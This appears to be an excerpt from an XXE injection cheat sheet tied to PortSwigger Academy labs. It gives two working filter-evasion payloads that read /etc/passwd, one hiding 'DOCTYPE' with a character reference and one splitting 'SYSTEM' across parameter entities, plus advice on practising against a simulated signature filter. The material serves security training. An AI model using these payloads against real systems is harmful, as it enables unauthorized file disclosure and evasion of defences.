# 07 — XXE Cheatsheet and PortSwigger Lab Mapping
...
### 10. WAF / filter bypass — character reference encoding

```xml
<!D&#x4F;CTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
Numeric character reference (`&#x4F;` = `O`) reassembled by the parser after a
signature filter has already passed the request through. See file 5.

### 11. WAF / filter bypass — split-keyword parameter entity

```xml
<!ENTITY % p1 "SY"><!ENTITY % p2 "STEM">
<!ENTITY % build "<!ENTITY xxe %p1;%p2; 'file:///etc/passwd'>">
%build;
```
The literal word `SYSTEM` never appears contiguous in the request; the DTD parser
reassembles it from two fragments. See file 5.
...
- File 5 (WAF/filter bypass) has no dedicated Academy lab of its own — the Academy labs
  assume a clean parser with no perimeter filtering, since they're testing your
  understanding of the parser mechanics rather than WAF evasion specifically. Practice
  file 5's techniques by re-attempting any of the labs above with a local proxy rule
  that blocks the literal strings `DOCTYPE`/`ENTITY`/`SYSTEM`, simulating a basic
  signature filter, and confirming your obfuscated payload still solves the lab.
...
XXEinjector (file 6); the manual repetition is what makes the parameter-entity chain
